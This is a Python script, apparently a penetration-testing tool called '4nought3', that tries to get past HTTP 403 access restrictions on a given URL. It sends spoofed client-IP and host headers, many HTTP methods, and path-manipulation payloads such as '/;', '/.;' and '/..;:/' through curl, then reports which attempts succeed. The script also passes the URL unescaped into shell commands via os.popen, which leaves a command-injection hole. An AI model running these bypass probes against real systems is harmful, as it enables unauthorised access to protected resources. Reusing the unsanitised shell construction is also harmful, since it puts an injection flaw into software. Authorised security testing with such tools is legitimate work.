#!/usr/bin/python
import os
import sys

print(" _  _                           _     _   _____")
print("| || |  _ __   ___  _   _  __ _| |__ | |_|___ /")
print("| || |_| '_ \ / _ \| | | |/ _` | '_ \| __| |_ \\")
print("|__   _| | | | (_) | |_| | (_| | | | | |_ ___) |")
print("   |_| |_| |_|\___/ \__,_|\__, |_| |_|\__|____/ ")
print("                          |___/                 ")
print("                       ~By BlackBurn aka Prameya")

def host_header_injection(header, defined_url):
    command = os.popen("curl -k -s -I -X GET -H \"%s\" %s" % (header, defined_url))
    status = command.read().strip().split(" ")[1]
    if int(status) == 200:
        return("%s --> \033[1;32;40m%s\033[0m" % (header, status))
    else:
        return("%s --> \033[1;31;40m%s\033[0m" % (header, status))

def http_methods(method, defined_url):
    command = os.popen("curl -k -s -I -X %s %s" % (method, defined_url))
    status = command.read().strip().split(" ")[1]
    if int(status) == 200:
        return("%s --> \033[1;32;40m%s\033[0m" % (method, status))
    else:
        return("%s --> \033[1;31;40m%s\033[0m" % (method, status))
    
def url_injection(payload, defined_url):
    uri = defined_url.split("/")[-1]
    uri = "/"+uri
    remaining_url = defined_url.replace(uri, "")
    payload_url = remaining_url+payload+uri
    command = os.popen("curl -k -s -I '%s'" % (payload_url))
    status = command.read().strip().split(" ")[1]
    if int(status) == 200:
        return("%s --> \033[1;32;40m%s\033[0m" % (payload_url, status))
    else:
        return("%s --> \033[1;31;40m%s\033[0m" % (payload_url, status))

def url_end_injection(payload, defined_url):
    payload_url = defined_url + payload
    command = os.popen("curl -k -s -I '%s'" % (payload_url))
    status = command.read().strip().split(" ")[1]
    if int(status) == 200:
        return("%s --> \033[1;32;40m%s\033[0m" % (payload_url, status))
    else:
        return("%s --> \033[1;31;40m%s\033[0m" % (payload_url, status))
    

if len(sys.argv) != 2:
    print("\033[1;31;40mSyntax error: \033[1;32;40muse \"python 4nought3.py url\"")
else:
    url = sys.argv[1]
#//////////////////////HOST HEADER INJECTIONS////////////////////////
    print("[+]Trying Host Header Injections:")
    print(host_header_injection("X-Forwarded-For: 127.0.0.1", url))
    print(host_header_injection("X-Originating-IP: 127.0.0.1", url)) 
    print(host_header_injection("X-Remote-IP: 127.0.0.1", url))
    print(host_header_injection("X-Client-IP: 127.0.0.1", url))
    print(host_header_injection("X-Forwarded-Host: 127.0.0.1", url))
    print(host_header_injection("X-Host: 127.0.0.1", url))
#//////////////////////POTENTIAL METHODS////////////////////////////
    print("[+]Trying all the potential HTTP methods")
    print(http_methods("GET", url))
    print(http_methods("POST", url))
    print(http_methods("PUT", url))
    print(http_methods("CONNECT", url))
    print(http_methods("COPY", url))
    print(http_methods("PATCH", url))
    print(http_methods("TRACE", url))
    print(http_methods("HEAD", url))
    print(http_methods("UPDATE", url))
    print(http_methods("LABEL", url))
    print(http_methods("OPTIONS", url))
    print(http_methods("MOVE", url))
    print(http_methods("SEARCH", url))
    print(http_methods("ARBITRARY", url))
    print(http_methods("CHECKOUT", url))
    print(http_methods("UNCHECKOUT", url))
    print(http_methods("UNLOCK", url))
    print(http_methods("MERGE", url))
    print(http_methods("BASELINE-CONTROL", url))
    print(http_methods("ACL", url))
#/////////////////////URL Injections//////////////////////////
    print("[+]Trying url injections")
    print(url_injection("/;", url))
    print(url_injection("//", url))
    print(url_injection("/.;", url))
    print(url_injection("/%2e", url))
    print(url_injection("/.;/:", url))
    print(url_injection("/;foo=bar", url))
    print(url_injection("/;foo=bar;", url))
    print(url_end_injection("%20/", url)) 
    print(url_end_injection("/%09/", url))
    print(url_end_injection("/%2e/", url)) 
    print(url_end_injection("/.", url)) 
    print(url_end_injection("//", url))
    print(url_end_injection("/abcde/", url))
    print(url_end_injection("/.abcde/", url))
    print(url_end_injection("//?abcde/", url))
    print(url_end_injection("/..;:/", url))



    


